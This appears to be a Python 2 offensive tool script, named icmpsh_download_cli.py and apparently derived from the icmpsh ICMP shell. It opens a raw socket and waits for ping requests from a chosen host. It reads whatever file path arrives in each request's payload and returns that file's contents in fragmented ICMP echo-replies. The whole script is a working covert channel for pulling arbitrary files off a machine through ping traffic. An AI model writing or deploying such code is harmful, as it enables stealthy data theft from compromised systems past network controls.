#!/usr/bin/env python

import os
import select
import socket
import subprocess
import sys
from struct import *

from scapy.all import send, fragment, IP, ICMP

def main(src, dst):
    try:
        from impacket import ImpactDecoder
        from impacket import ImpactPacket
    except ImportError:
        sys.stderr.write('You need to install Python Impacket library first\n')
        sys.exit(255)

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except socket.error, e:
        sys.stderr.write('You need to run with administrator privileges\n')
        sys.exit(1)

    sock.setblocking(0)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    decoder = ImpactDecoder.IPDecoder()

    while True:
        if sock in select.select([ sock ], [], [])[0]:
            buff = sock.recv(4096)

        if 0 == len(buff):
            sock.close()
            sys.exit(0)

        ippacket = decoder.decode(buff)
        icmppacket = ippacket.child()

        if ippacket.get_ip_dst() == src and ippacket.get_ip_src() == dst and 8 == icmppacket.get_icmp_type():
            ident = icmppacket.get_icmp_id()
            seq_id = icmppacket.get_icmp_seq()
            data = icmppacket.get_data_as_string()

            try:
                infos = data[:6]
                filename = data[6:]
                dataUnpacked = unpack('IH',infos)
                offset = dataUnpacked[0]
                size = dataUnpacked[1]
                sys.stdout.write("Filename : " + filename + "\nOffset : " + str(offset) + "\n")
                try:
                    f = open(filename)
                except:
                    print "%s not found"%filename
                    continue
                f.seek(offset)
                line = f.read(size)
                f.close()

                send(fragment(IP(dst=sys.argv[2]) / ICMP(type='echo-reply', id=ident, seq=seq_id)  / (line)))
            except:
                if len(data) == 0:
                    print "End"
                else:
                    print "Invalid ICMP buffer"


if __name__ == '__main__':
    if len(sys.argv) < 3:
        msg = 'missing mandatory options. Execute as root:\n'
        msg += './icmpsh_download_cli.py <source IP address> <destination IP address>\n'
        sys.stderr.write(msg)
        sys.exit(1)

    main(sys.argv[1], sys.argv[2])
